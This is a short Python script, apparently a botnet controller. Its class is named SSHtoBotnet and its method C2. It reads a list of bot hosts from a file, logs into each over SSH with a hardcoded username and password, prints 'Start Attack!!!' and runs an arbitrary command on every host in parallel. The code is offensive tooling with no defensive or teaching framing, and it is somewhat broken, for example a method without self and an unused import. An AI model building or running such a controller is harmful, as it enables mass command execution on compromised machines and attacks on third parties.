from pssh.clients import ParallelSSHClient
from pssh.config import HostConfig
import argparse

class SSHtoBotnet:
    def C2(command):
        hosts = []
        for client in open('botlist.txt','r').readlines():
            result = client.split("$")
            hosts.append(result[0])
        config = [HostConfig(user='bach', password='2349567')]

        client = ParallelSSHClient(hosts,host_config=config)


        print("Start Attack!!!")
        output = client.run_command(command)

